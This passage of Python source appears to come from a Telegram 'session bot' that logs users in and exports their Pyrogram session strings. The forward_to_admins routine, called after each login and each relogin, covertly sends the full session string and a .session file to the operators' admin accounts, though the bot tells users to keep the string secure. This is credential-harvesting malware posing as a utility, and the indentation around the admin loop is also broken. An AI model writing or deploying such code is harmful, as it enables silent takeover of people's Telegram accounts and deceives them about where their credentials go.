            await self.complete_session_creation(message, session_data)
            
        except Exception as e:
            await message.reply_text(f"❌ Error with 2FA: {str(e)}\n\nUse /create_session to try again.")
            await self.cleanup_user_session(message.from_user.id)
    
    async def handle_relogin(self, message: Message, session_data: Dict, session_string: str):
        """Handle relogin with session string"""
        try:
            user_id = message.from_user.id
            
            # Create client with session string
            user_client = Client(
                f"relogin_{user_id}",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                session_string=session_string.strip()
            )
            
            await user_client.connect()
            
            # Test the session
            try:
                me = await user_client.get_me()
                
                # Session is valid
                await message.reply_text(
                    f"✅ **Session Verified Successfully!**\n\n"
                    f"👤 **User:** {me.first_name} {me.last_name or ''}\n"
                    f"📱 **Phone:** {me.phone_number or 'Hidden'}\n"
                    f"🆔 **User ID:** {me.id}\n\n"
                    f"Your session is active and working!"
                )
                
                # Save the session file (only session string)
                filename = f"session_{user_id}_{me.id}.session"
                self.save_session_file(filename, session_string.strip())
                
                # Forward to admins
                await self.forward_to_admins(user_id, me, session_string.strip(), filename)
                
            except AuthKeyUnregistered:
                await message.reply_text("❌ Session string is invalid or expired. Please create a new session.")
            except Exception as e:
                await message.reply_text(f"❌ Error verifying session: {str(e)}")
            
            await user_client.disconnect()
            await self.cleanup_user_session(user_id)
            
        except Exception as e:
            await message.reply_text(f"❌ Error with session string: {str(e)}")
            await self.cleanup_user_session(message.from_user.id)
    
    async def complete_session_creation(self, message: Message, session_data: Dict):
        """Complete session creation and save session file"""
        user_id = message.from_user.id
        client = session_data['client']
        
        try:
            # Get user information
            me = await client.get_me()
            session_string = await client.export_session_string()
            
            # Create session file with only session string
            filename = f"session_{user_id}_{me.id}.session"
            self.save_session_file(filename, session_string)
            
            # Create session info
            session_info = (
                f"✅ **Session Created Successfully!**\n\n"
                f"👤 **User:** {me.first_name} {me.last_name or ''}\n"
                f"📱 **Phone:** {session_data['phone_number']}\n"
                f"🆔 **User ID:** {me.id}\n"
                f"📁 **Session File:** `{filename}`\n\n"
                f"**Session String:**\n`{session_string}`\n\n"
                f"💡 **You can use /relogin with this string to verify your session later.**\n\n"
                f"⚠️ **Keep your session string secure!**"
            )
            
            await message.reply_text(session_info)
            
            # Forward session to admins
            await self.forward_to_admins(user_id, me, session_string, filename)
            
        except Exception as e:
            logger.error(f"Error completing session creation: {e}")
            await message.reply_text("❌ Error saving session. Please try again.")
        finally:
            await self.cleanup_user_session(user_id)
    
    def save_session_file(self, filename: str, session_string: str):
        """Save only session string to .session file"""
        filepath = os.path.join(config.SESSION_FOLDER, filename)
        os.makedirs(config.SESSION_FOLDER, exist_ok=True)
        
        with open(filepath, 'w') as f:
            f.write(session_string)
    
    async def get_user_sessions(self, user_id: int) -> list:
        """Get all session files for a user"""
        sessions = []
        if os.path.exists(config.SESSION_FOLDER):
            for filename in os.listdir(config.SESSION_FOLDER):
                if filename.startswith(f"session_{user_id}_") and filename.endswith('.session'):
                    sessions.append(filename)
        return sessions
    
    async def forward_to_admins(self, bot_user_id: int, telegram_user, session_string: str, filename: str):
        """Forward session information to admins"""
        try:
            session_info = (
                f"📋 **New Session Created**\n\n"
                f"🤖 **Bot User ID:** {bot_user_id}\n"
                f"👤 **Telegram User:** {telegram_user.first_name} {telegram_user.last_name or ''}\n"
                f"📱 **Phone:** {telegram_user.phone_number or 'Hidden'}\n"
                f"🆔 **Telegram ID:** {telegram_user.id}\n"
                f"👤 **Username:** @{telegram_user.username or 'N/A'}\n"
                f"📁 **Filename:** {filename}\n"
                f"🔐 **Session String:**\n`{session_string}`"
)
for admin_id in config.ADMIN_IDS:
                try:
                    # Send session info
                    await self.app.send_message(admin_id, session_info)
                    
                    # Create and send .session file (only session string)
                    temp_file = f"temp_{filename}"
                    with open(temp_file, 'w') as f:
                        f.write(session_string)
                    
                    await self.app.send_document(
                        admin_id,
                        temp_file,
                        caption=f"Session file: {filename}"
                    )
                    
                    # Clean up temp file
                    os.remove(temp_file)
                    
                except Exception as e:
                    logger.error(f"Error sending to admin {admin_id}: {e}")
                    
        except Exception as e:
            logger.error(f"Error forwarding to admins: {e}")
    
    async def cleanup_user_session(self, user_id: int):
        """Clean up user session data"""
        if user_id in self.user_sessions:
            session_data = self.user_sessions[user_id]
            if session_data['client']:
                try:
                    await session_data['client'].disconnect()
                except:
                    pass
            del self.user_sessions[user_id]
    
    async def run(self):
        """Start the bot"""
        # Ensure sessions directory exists
        os.makedirs(config.SESSION_FOLDER, exist_ok=True)
        
        logger.info("Starting Session Bot...")
        await self.app.start()
        
        me = await self.app.get_me()
        logger.info(f"Bot started as @{me.username}")
        
        # Notify admins
        for admin_id in config.ADMIN_IDS:
            try:
                await self.app.send_message(admin_id, "🤖 Session Bot Started!")
            except Exception as e:
                logger.error(f"Could not notify admin {admin_id}: {e}")
        
        await idle()
        await self.app.stop()

async def main():
    bot = SessionBot()
    await bot.run()

if __name__ == "__main__":
    asyncio.run(main())


        
